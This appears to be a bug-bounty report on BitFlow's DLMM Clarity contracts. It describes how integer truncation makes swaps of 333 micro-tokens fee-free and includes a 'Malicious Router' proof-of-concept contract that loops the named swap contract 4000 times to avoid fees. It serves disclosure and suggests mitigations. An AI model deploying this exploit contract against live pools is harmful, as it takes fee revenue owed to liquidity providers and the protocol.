# Immunefi Vulnerability Report: BitFlow DLMM

## Title
MEV Evasion Vector: Complete bypass of Protocol and LP Fees via Truncation Micro-Routing in DLMM Bins

## Vulnerability Category
Smart Contract - High (Theft of Yield / Bypass of Protocol Fees)

## Target
BitFlow Finance - DLMM Contracts (PR #273)
Core logic affected: Fee scaling and deduction logic within active liquidity bins.

## Brief Description
Due to Clarity’s lack of floating-point arithmetic and the protocol's fee scaling design (`FEE_SCALE_BPS = 10000`), an integer truncation vulnerability exists in the core fee deduction logic. 

When a swap or liquidity operation occurs, the fee is calculated via:
```lisp
(/ (* token-delta FEE_BPS) FEE_SCALE_BPS)
```

Assuming a standard fee tier of 30 BPS (0.3%), if an attacker sizes the transaction so that `token-delta` is `<= 333` micro-tokens, the calculation becomes:
`(/ (* 333 30) 10000) = (/ 9990 10000) = 0`

Because Clarity truncates integer division towards zero, the computed fee is **exactly 0**. While a 333 micro-token swap is negligible in isolation, an MEV bot or malicious router can exploit Clarity's `fold` function to loop this micro-transaction thousands of times within a single block. This allows the attacker to execute arbitrarily large swap volumes across the DLMM without paying any fees to the Protocol or the Liquidity Providers (LPs), effectively stealing the LP yield.

## Impact
1. **Systemic LP Yield Theft:** LPs suffer from impermanent loss without receiving the compensating trading fees, making the AMM mathematically unprofitable for honest providers.
2. **Protocol Revenue Bypass:** The protocol treasury loses 100% of its expected fee revenue from any routed volume exploiting this vector.
3. **MEV Exploitation:** Given Stacks' relatively low transaction costs, wrapping a 4000-iteration `fold` loop executing 333-token swaps is highly economically viable for MEV searchers.

## Proof of Concept (Clarity)

The following Clarity script demonstrates how a malicious contract can wrap the DLMM swap function in a `fold` loop to execute massive volume while forcing the fee calculation to evaluate to zero.

```lisp
;; @contract Malicious Router (Fee Evasion PoC)
;; This contract exploits the truncation vector to bypass fees.

(define-constant MICRO_ROUTING_CHUNK u333) ;; Delta that results in 0 fee at 30 BPS
(define-constant MAX_ITERATIONS u4000)     ;; Max fold limit to pack in a single tx

;; Dummy list of iterations to power the fold loop
(define-data-var loop-list (list 4000 uint) (list u1 u2 u3 ...)) ;; Omitted for brevity, assume populated list

(define-private (exploit-step (iter uint) (acc-state uint))
  (begin
    ;; Call the DLMM swap function with the exact truncation chunk
    ;; The protocol will calculate: (/ (* u333 u30) u10000) = u0 fees
    (contract-call? 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.bitflow-dlmm swap-x-for-y MICRO_ROUTING_CHUNK)
    (+ acc-state MICRO_ROUTING_CHUNK)
  )
)

(define-public (execute-zero-fee-drain)
  (let 
    (
      ;; Execute 4000 micro-swaps in a single Stacks transaction
      (total-swapped (fold exploit-step (var-get loop-list) u0))
    )
    (ok total-swapped) ;; Returns 1,332,000 micro-tokens swapped with 0 fees paid
  )
)
```

## Recommended Mitigation
Do not rely on downstream integer division for fee floors. Implement a minimum non-zero fee enforcement (e.g., if token delta > 0, fee is at least `u1`), OR accumulate the remainder/dust globally across transactions, OR require a minimum trade size (`MIN_SWAP_AMOUNT`) that mathematically prevents the fee equation from truncating to zero at the active `FEE_BPS` tier.
